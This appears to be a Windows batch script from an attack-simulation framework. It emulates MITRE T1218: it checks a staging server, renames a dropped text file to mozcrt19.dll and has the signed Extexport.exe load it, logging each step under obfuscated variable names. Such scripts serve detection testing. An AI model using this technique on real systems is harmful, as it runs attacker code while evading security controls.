@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET douyiw=%APPDATA%\7768\b0feed6e
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?7768-10
SET eykalkg=BALAM-S2B
SET fkesh=10
SET ecrfwq=visio.txt
SET rgnpbq=7768

REM Derived variables
SET wlkdsg=%APPDATA%\!fkesh!
SET pzkmrv=!wlkdsg!\macula-simulations.log
SET mbnvhq=Extexport.exe
SET dgsmjt=T1218
SET zkxnjw=Signed Binary Proxy Execution

REM Debug: script start
echo [!DATE! !TIME!][DEBUG][!eykalkg!]: script_start===>>> "!pzkmrv!" 2>nul

REM Check server availability
echo [!DATE! !TIME!][DEBUG][!eykalkg!]: heartbeat_start===>>> "!pzkmrv!" 2>nul
curl -k -s -o nul "!frytcn!"
IF !ERRORLEVEL! EQU 0 (
    SET htyqmv=1
    SET sptlwk=
) ELSE (
    SET htyqmv=0
    SET sptlwk=connection_failed
)
echo [!DATE! !TIME!][DEBUG][!eykalkg!]: heartbeat_complete===>>> "!pzkmrv!" 2>nul

REM TTP logging: T1218 - Signed Binary Proxy Execution
SET ryxwba=!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2!
SET nqjpmw=!TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,3!
(echo [!ryxwba! !nqjpmw!][!eykalkg!]: !fkesh!-!rgnpbq!-!dgsmjt!|!zkxnjw!=!htyqmv!:!sptlwk!) >> "!pzkmrv!" 2>nul

IF !htyqmv! NEQ 1 (
    echo [!DATE! !TIME!][DEBUG][!eykalkg!]: heartbeat_failed_exit===>>> "!pzkmrv!" 2>nul
    EXIT /B 1
)

REM Change directory
echo [!DATE! !TIME!][DEBUG][!eykalkg!]: chdir_start=!douyiw!>>> "!pzkmrv!" 2>nul
cd /D "!douyiw!" 2>nul
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][DEBUG][!eykalkg!]: chdir_failed=!douyiw!>>> "!pzkmrv!" 2>nul
    EXIT /B 1
)
echo [!DATE! !TIME!][DEBUG][!eykalkg!]: chdir_complete===>>> "!pzkmrv!" 2>nul

REM Rename output file to mozcrt19.dll
echo [!DATE! !TIME!][DEBUG][!eykalkg!]: rename_start=!ecrfwq!>>> "!pzkmrv!" 2>nul
IF EXIST "!ecrfwq!" (
    ren "!ecrfwq!" mozcrt19.dll 2>nul
    IF !ERRORLEVEL! EQU 0 (
        echo [!DATE! !TIME!][DEBUG][!eykalkg!]: rename_complete===>>> "!pzkmrv!" 2>nul
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!eykalkg!]: rename_failed===>>> "!pzkmrv!" 2>nul
    )
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!eykalkg!]: source_not_found=!ecrfwq!>>> "!pzkmrv!" 2>nul
)

REM Execute DLL via signed binary
echo [!DATE! !TIME!][DEBUG][!eykalkg!]: dll_load_start===>>> "!pzkmrv!" 2>nul
"!mbnvhq!" "!douyiw!" foo bar 2>nul
SET cxhzlt=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!eykalkg!]: dll_load_complete=!cxhzlt!>>> "!pzkmrv!" 2>nul

IF !cxhzlt! EQU 0 (
    SET yjnftw=1
    SET lvczpd=
) ELSE (
    SET yjnftw=0
    SET lvczpd=exit_code_!cxhzlt!
)

REM TTP logging: T1218 execution result
SET ryxwba=!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2!
SET nqjpmw=!TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,3!
(echo [!ryxwba! !nqjpmw!][!eykalkg!]: !fkesh!-!rgnpbq!-!dgsmjt!|!zkxnjw!=!yjnftw!:!lvczpd!) >> "!pzkmrv!" 2>nul

echo [!DATE! !TIME!][DEBUG][!eykalkg!]: script_end===>>> "!pzkmrv!" 2>nul
ENDLOCAL